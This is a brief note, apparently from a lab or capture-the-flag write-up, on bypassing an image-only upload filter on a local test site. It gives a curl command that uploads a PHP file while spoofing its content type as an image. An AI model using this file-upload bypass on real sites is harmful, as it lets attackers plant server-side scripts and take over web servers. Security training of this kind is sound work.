Navigate to file upload page by cicking "add image". We can upload only jpeg. But we can fake that we uploading jpeg and download bad php script. - 
touch /tmp/exploit.php
curl -X POST -F "Upload=Upload" -F "uploaded=@/tmp/exploit.php;type=image/jpg" "http://localhost:8080/index.php?page=upload"
